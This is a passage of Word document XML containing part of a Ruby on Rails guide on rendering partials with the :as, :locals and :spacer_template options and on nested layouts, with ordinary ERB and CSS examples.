    <w:p w14:paraId="10946C61" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To use a custom local variable name within the partial, specify the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option in the call to the partial:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2CBB04D3" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="290E82C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1529224188"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "product", :collection</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @products, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :item</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1DB4DCE9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this change, you can access an instance of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@products</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> collection as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>item</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> local variable within the partial.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8B8A58" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also pass in arbitrary local variables to any partial you are rendering with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:locals =&gt; {}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="684116D0" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A47388D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'products', :collection</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @products,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69511FE2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>           :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :item, :locals</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {:title</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Products Page"} %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2415111E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Would render a partial </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_products.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> once for each instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@products</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance variable passing the instance to the partial as a local variable called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>item</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and to each partial, make the local variable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>title</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> available with the value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Products Page</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573E606C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails also makes a counter variable available within a partial called by the collection, named after the member of the collection followed by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_counter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. For example, if you’re rendering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@products</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, within the partial you can refer to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>product_counter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to tell you how many times the partial has been rendered. This does not work in conjunction with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as =&gt; :value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F05F5BD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also specify a second partial to be rendered between instances of the main partial by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:spacer_template</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B119B7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.7 Spacer Templates</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6B6B9363" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F347B51" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="119610661"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @products, :spacer_template</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "product_ruler"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19022950" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails will render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_product_ruler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> partial (with no data passed in to it) between each pair of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> partials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F7AEB8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Using Nested Layouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F67559" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You may find that your application requires a layout that differs slightly from your regular application layout to support one particular controller. Rather than repeating the main layout and editing it, you can accomplish this by using nested layouts (sometimes called sub-templates). Here’s an example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7400D37D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Suppose you have the following </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBE526D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="83"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/application.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="10FF6096" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="466D0EB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60DA6AA1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36398EC3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;title&gt;&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@page_title</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>or</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'Page Title'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/title&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5926945F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag 'layout'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3816EFEE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;style</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>type="text/css"&gt;&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>:stylesheets</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/style&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62FF5B1F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7957900C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3E09C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="top_menu"&gt;Top menu items here&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A091271" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="menu"&gt;Menu items here&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49157761" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="content"&gt;&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>content_for?(:content) ? yield(:content) : yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5791A7AB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09DA2663" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30290BF2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On pages generated by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NewsController</w:t>
      </w:r>
      <w:r>
        <w:t>, you want to hide the top menu and add a right menu:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BC1842" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/news.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="38E71B5E" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17FB718C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>content_for :stylesheets</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="243FCBF9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  #top_menu {display: none}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E80C734" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  #right_menu {float: right; background-color: yellow; color: black}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D66F51F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21D6A14C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>content_for :content</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41F69DFA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
